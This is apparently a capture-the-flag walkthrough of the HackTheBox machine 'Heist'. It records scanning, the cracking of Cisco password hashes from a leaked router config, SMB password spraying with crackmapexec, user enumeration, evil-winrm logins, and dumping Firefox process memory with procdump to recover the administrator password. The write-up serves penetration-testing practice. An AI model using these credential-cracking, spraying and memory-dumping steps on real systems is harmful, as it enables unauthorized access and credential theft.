Heist IP:10.10.10.149



rustscan:
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
445/tcp   open  microsoft-ds syn-ack
5985/tcp  open  wsman        syn-ack
49669/tcp open  unknown      syn-ack




nmap:

PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
445/tcp   open  microsoft-ds? syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 15677/tcp): CLEAN (Timeout)
|   Check 2 (port 48515/tcp): CLEAN (Timeout)
|   Check 3 (port 25486/udp): CLEAN (Timeout)
|   Check 4 (port 15456/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-09T09:17:05
|_  start_date: N/A


gobuster:

 gobuster dir  -u http://10.10.10.149  -w /usr/share/wordlists/dirb/common.txt -t 64   
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.149
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/02/09 04:15:08 Starting gobuster
===============================================================
/attachments (Status: 301)
/css (Status: 301)
/images (Status: 301)
/Images (Status: 301)
/index.php (Status: 302)
/js (Status: 301)
===============================================================
2023/02/09 04:15:13 Finished
===============================================



nikto -h http://10.10.10.149
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.149
+ Target Hostname:    10.10.10.149
+ Target Port:        80
+ Start Time:         2023-02-09 04:16:36 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: PHP/7.3.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Root page / redirects to: login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ /login.php: Admin login page/section found.
+ 7863 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-02-09 04:27:01 (GMT-5) (625 seconds)




if we inspect the site on port 80, it redirects us to a login page. However there is an option to log in as a guest. By doing this, you are presented with a conversation and an attachment file

attach file:


version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh


COnversation:




    Hazard
    20 minutes ago
    Hi, I've been experiencing problems with my cisco router. Here's a part of the configuration the previous admin had been using. I'm new to this and don't know how to fix it. :(
    Attachment
        Support Admin
        10 minutes ago
        Hi, thanks for posting the issue here. We provide fast support and help. Let me take a look and get back to you!
        Hazard
        10 minutes ago
        Thanks a lot. Also, please create an account for me on the windows server as I need to access the files.




  let's try to crack the passwords in the attachment
  
  for the 7 passwords use:       https://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html

  0242114B0E143F015F5D1E161713 -> $uperP@ssword
  02375012182C1A1D751618034F36415408  -> Q4)sJu\Y8qz*A3?d
  $1$pdQG$o8nrSzsGXeaduXrjlvKc91 -> stealth1agent

  the last password we can crack it with john

  john --wordlist=/usr/share/wordlists/rockyou.txt hash    
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)     
1g 0:00:00:09 DONE (2023-02-09 04:30) 0.1108g/s 388640p/s 388640c/s 388640C/s stealthy001..ste88dup
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


now that we have some passwords, we could create a list of passwords and a list of usernames ( from the attachment file) and use crackmapexec to check if we can find a match of user and pass

┌──(kali㉿kali)-[~/Practice/HackTheBox/Heist]
└─$ crackmapexec smb 10.10.10.149 -u users -p passwords                                                                                                                                          2 ⨯
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 


we did find one: hazard : stealth1agent


smbmap -H 10.10.10.149 -u hazard -p stealth1agent 
[+] IP: 10.10.10.149:445        Name: heist.htb                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
                                                                                                


From the users found in the attachment,only hazard and administrator exists on the machine

┌──(kali㉿kali)-[~/Practice/HackTheBox/Heist]
└─$ rpcclient -U 'hazard%stealth1agent' 10.10.10.149                                                                                                                                             1 ⨯
rpcclient $> lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
rpcclient $> lookupnames administrator
administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)
rpcclient $> lookupnames rout3r
result was NT_STATUS_NONE_MAPPED
rpcclient $> lookupnames admin
result was NT_STATUS_NONE_MAPPED
rpcclient $> 

We should find a way to enumerate all the users on the machine


One way to do that easily is by using lookupsid.py from impacket

kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./lookupsid.py hazard:stealth1agent@heist.htb                                                                                                                                                1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at heist.htb
[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)


using crackmapexec we can find the password of chase

 crackmapexec smb 10.10.10.149 -u users -p passwords
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\chase:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d 


foothold as chase: Using evil-winrm we can log in as chase:

evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'                                                                                                                                    1 ⨯

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents> dir
*Evil-WinRM* PS C:\Users\Chase\Documents> cd ..
*Evil-WinRM* PS C:\Users\Chase> cd Desktop
*Evil-WinRM* PS C:\Users\Chase\Desktop> dir


    Directory: C:\Users\Chase\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2019   9:08 AM            121 todo.txt
-ar---         2/9/2023   2:42 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
dd0a71975dc28f9f8232be903f8da57d
*Evil-WinRM* PS C:\Users\Chase\Desktop> 



*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.



PrivEsc:

it seems that Firefox is installed, and there are firefox processes running:

*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming> cd Mozilla
*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla> ls


    Directory: C:\Users\Chase\appdata\Roaming\Mozilla


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/22/2019   8:01 AM                Extensions
d-----        2/18/2021   4:17 PM                Firefox
d-----        4/22/2019   8:01 AM                SystemExtensionsDev


*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    453      17     2204       5352               372   0 csrss
    287      13     2168       5116               484   1 csrss
    360      15     3552      14780              4532   1 ctfmon
    253      14     3912      13388              3524   0 dllhost
    166       9     1840       9764       0.02   4368   1 dllhost
    618      32    29468      57316               976   1 dwm
   1494      58    23860      78320              4768   1 explorer
    378      28    22220      58828       0.75   2516   1 firefox
    401      33    32504      88960       0.88   4984   1 firefox
    347      19    10120      35616       0.11   5440   1 firefox
   1176      69   133496     209452       8.48   5700   1 firefox
    355      25    16452      39024       0.17   6344   1 firefox
     49       6     1788       4656               772   1 fontdrvhost
     49       6     1500       3864               780   0 fontdrvhost
      0       0       56          8                 0   0 Idle
    956      23     5652      14728               632   0 lsass
    223      13     2968      10280              3856   0 msdtc
      0      12      276      14616                88   0 Registry
    303      16     5516      16996              5276   1 RuntimeBroker
    145       8     1620       7568              5348   1 RuntimeBroker
    275      14     3032      15100              5660   1 RuntimeBroker
    683      33    19912      61488              4116   1 SearchUI




Taking in consideration that Firefox is installed and firefox processes are running, we can upload procdump64.exe to dump a log from a firefox process
*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla> cd C:\Windows\System32\spool\drivers\color
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> upload procdump64.exe
Info: Uploading procdump64.exe to C:\windows\system32\spool\drivers\color\procdump64.exe

Data: 455560 bytes of 455560 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\procdump64.exe -accepteula -ma 4984
ProcDump v9.0 - Sysinternals process dump utility
Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[21:15:31] Dump 1 initiated: C:\Windows\System32\spool\drivers\color\firefox.exe_230209_153526.dmp
[21:15:32] Dump 1 writing: Estimated dump file size is 265 MB.
[21:15:35] Dump 1 complete: 265 MB written in 3.6 seconds
[21:15:35] Dump count reached.

*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> 

we can upload strings.exe to save the output of the dump file


*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> upload strings64.exe
Info: Uploading strings64.exe to C:\windows\system32\spool\drivers\color\strings64.exe

Data: 218676 bytes of 218676 bytes copied

Info: Upload successful!

Evil-WinRM* PS C:\windows\system32\spool\drivers\color> cmd /c "strings64.exe -accepteula ffirefox.exe_230209_153526.dmp > firefox.exe_230209_153526.txt"
cmd.exe :
    + CategoryInfo          : NotSpecified: (:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Strings v2.53 - Search for ANSI and Unicode strings in binary images.       
Copyright (C) 1999-2016 Mark Russinovich             
Sysinternals - www.sysinternals.com

*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> ls


    Directory: C:\Windows\System32\spool\drivers\color


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/15/2018  12:42 PM           1058 D50.camp
-a----        9/15/2018  12:42 PM           1079 D65.camp
-a----         2/9/2023   3:35 PM      342870868 firefox.exe_230209_153526.dmp
-a----         2/9/2023   3:41 PM      103890978 firefox.exe_230209_153526.txt
-a----        9/15/2018  12:42 PM            797 Graphics.gmmp
-a----        9/15/2018  12:42 PM            838 MediaSim.gmmp
-a----        9/15/2018  12:42 PM            786 Photo.gmmp
-a----         2/9/2023   3:32 PM         791960 procdump.exe
-a----         2/9/2023   3:34 PM         424856 procdump64.exe
-a----        9/15/2018  12:42 PM            822 Proofing.gmmp
-a----        9/15/2018  12:42 PM         218103 RSWOP.icm
-a----        9/15/2018  12:42 PM           3144 sRGB Color Space Profile.icm
-a----         2/9/2023   3:37 PM         478088 strings64.exe
-a----        9/15/2018  12:42 PM          17155 wscRGB.cdmp
-a----        9/15/2018  12:42 PM           1578 wsRGB.cdmp


we can search for the word "password" exposed in some get requests:

*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> findstr "password" ./firefox.exe_230209_153526.txt




http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=


now with the password in clear text, we use evil-winrm to log in as administrator:


─(kali㉿kali)-[~/Practice/HackTheBox/Heist]
└─$ evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
supportdesk\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         2/9/2023   2:42 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
efe96c5146a867928dee5c567861d016
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
